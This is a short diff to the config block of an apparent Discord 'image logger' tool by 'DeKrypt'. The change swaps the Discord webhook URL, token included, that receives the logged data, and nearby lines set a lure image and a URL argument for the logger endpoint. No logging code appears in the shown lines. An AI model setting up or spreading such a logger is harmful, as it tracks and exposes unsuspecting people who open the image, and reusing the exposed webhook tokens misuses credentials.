@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1089579044267364412/K4T8dmZeeWoyi2FPMoEKYy6NdtldTwbRgnxmKxBzsIUq5t1mD9wWB3AM0Scfk8GVWM7k",
+    "webhook": "https://discord.com/api/webhooks/1089584530953867334/7ZlxmTueDxAe7z5XxvIfhms1Z93Cpei6AI2T6zG_GblbBdjEJkir9z0hdpVGqG_LJdCF",
     "image": "https://content1.promiflash.de/article-images/cinema450/bill-kaulitz-macht-in-boxershorts-ein-selfie.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
